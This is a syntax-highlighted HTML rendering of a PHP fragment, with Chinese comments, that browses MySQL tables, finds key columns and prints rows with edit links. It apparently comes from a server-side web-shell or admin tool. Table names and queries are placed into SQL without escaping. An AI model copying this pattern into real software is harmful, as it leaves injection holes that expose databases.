<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">getfield</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SHOW COLUMNS FROM $tablename"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">keyfied</span> = <span style="color: #70c0b1;">''</span>; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#20027;&#38190;&#23383;&#27573;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">row</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_fetch_assoc(</span>$<span style="color: #e7c547;">getfield</span>)) <span style="text-decoration: underline;">{</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span>[$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>]][<span style="color: #70c0b1;">'Key'</span>] = $<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Key</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span>[$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>]][<span style="color: #70c0b1;">'Extra'</span>] = $<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'E</span><span style="color: #70c0b1; text-decoration: underline;">xtra'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Key'</span>] == <span style="color: #70c0b1;">'UNI'</span> || $<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Key'</span>] <span style="text-decoration: underline;">== </span><span style="color: #70c0b1; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">keyfied</span> = $<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">/*********************</span><span style="color: #969896; font-style: italic;">/</span><span style="color: #d54e53; background-color: #424242;">                     </span><span style="color: #d54e53; background-color: #424242; text-decoration: underline;">            </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">keyfied</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">strtolower(substr(</span>$<span style="color: #e7c547;">query</span>,<span style="color: #eaeaea; background-color: #000000;">0</span>,<span style="color: #eaeaea; background-color: #000000;">1</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">3</span><span style="text-decoration: underline;">)) == </span><span style="color: #70c0b1; text-decoration: underline;">'select * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">query</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">" LIMIT "</span>, <span style="color: #70c0b1;">" order </span><span style="color: #70c0b1; text-decoration: underline;">by $keyfied DESC LIMIT "</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">query</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span>$<span style="color: #e7c547;">query</span>);

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">multipage</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;table border="0" cellpadding="3" cellspa</span><span style="color: #70c0b1; text-decoration: underline;">cing="0"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">allowedit</span>) <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fieldnum</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_num_fields(</span>$<span style="color: #e7c547;">result</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">i</span>=<span style="color: #eaeaea; background-color: #000000;">0</span>;$<span style="color: #e7c547;">i</span>&lt;$<span style="color: #e7c547;">fieldnum</span>;$<span style="color: #e7c547;">i</span>++){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">name</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_field_name(</span>$<span style="color: #e7c547;">result</span>, $<span style="color: #e7c547;">i</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">type</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_field_type(</span>$<span style="color: #e7c547;">result</span>, $<span style="color: #e7c547;">i</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">len</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_field_len(</span>$<span style="color: #e7c547;">result</span>, $<span style="color: #e7c547;">i</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #70c0b1; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #70c0b1; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #70c0b1; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">mn</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_fetch_assoc(</span>$<span style="color: #e7c547;">result</span>)){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">thisbg</span> = <span style="color: #eaeaea; background-color: #000000;">bg(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.$<span style="color: #e7c547;">thisbg</span>.<span style="color: #70c0b1;">'" onmouseover="</span><span style="color: #70c0b1; text-decoration: underline;">this.className=\'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">where</span> = $<span style="color: #e7c547;">tmp</span> = $<span style="color: #e7c547;">b1</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">mn</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span>=&gt;$<span style="color: #e7c547;">inside</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">inside</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">rowdb</span>[$<span style="color: #e7c547;">key</span>][<span style="color: #70c0b1;">'Key'</span>] == <span style="color: #70c0b1;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">where</span> = $<span style="color: #e7c547;">key</span>.<span style="color: #70c0b1;">"='"</span>.<span style="color: #eaeaea; background-color: #000000;">addslashe</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">s(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">break</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">where</span> .= $<span style="color: #e7c547;">tmp</span><span style="color: #d54e53; font-weight: bold;">.</span>$<span style="color: #e7c547;">key</span>.<span style="color: #70c0b1;">"='"</span>.<span style="color: #eaeaea; background-color: #000000;">addslas</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">hes(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tmp</span> = <span style="color: #70c0b1;">' AND '</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#35835;&#21462;&#35760;&#24405;&#29992;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">mn</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span>=&gt;$<span style="color: #e7c547;">inside</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">b1</span> .= <span style="color: #70c0b1;">'&lt;td nowrap&gt;'</span>.<span style="color: #eaeaea; background-color: #000000;">html_clean(</span>$<span style="color: #e7c547;">ins</span><span style="color: #e7c547; text-decoration: underline;">ide</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">where</span> = <span style="color: #eaeaea; background-color: #000000;">base64_encode(</span>$<span style="color: #e7c547;">where</span>);

